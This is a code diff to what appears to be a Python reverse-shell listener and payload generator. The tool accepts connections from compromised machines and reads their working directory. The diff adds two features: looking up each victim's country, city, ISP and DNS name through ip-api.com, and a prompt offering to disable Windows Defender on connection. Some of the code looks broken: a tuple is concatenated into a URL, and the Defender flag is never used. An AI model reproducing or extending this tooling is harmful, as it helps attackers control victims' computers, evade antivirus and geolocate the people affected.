@@ -1,5 +1,6 @@
 import os
 import socket
+import requests
 from pickle import GLOBAL
 logo = """
 
@@ -77,6 +78,17 @@ def listen(host, port):
     # accept any connections attempted
     client_socket, client_address = s.accept()
     print(f"{client_address[0]}:{client_address[1]} Connected!")
+    headers = {'Accept': 'application/json'}
+    url = 'http://ip-api.com/json/'+client_address+'?fields=country,city,zip,isp,org,reverse,mobile,proxy'
+    r = requests.get(url, headers = headers)
+    print('Country: '+r.json()['country'])
+    print('City: '+r.json()['city'])
+    print('zip: '+r.json()['zip'])
+    print('Organisation: '+r.json()['org'])
+    print('DNS name: '+r.json()['reverse'])
+    if r.json()['proxy'] == False:
+        print('Proxy: false')
+
 
     # receiving the current working directory of the client
     cwd = client_socket.recv(BUFFER_SIZE).decode()
@@ -247,5 +259,9 @@ if nscan == "3":
     gen_rev_http()
     postgen()
 if nscan == '4':
+    disable_defender = False
+    opt_mods = input('Do you want me to disable Windows Defender as soon as you connect? (y/n): ')
+    if opt_mods == 'y':
+        disable_defender = True
     port = int(input('Please enter the port u want to listen on: '))
     listen('0.0.0.0', port)
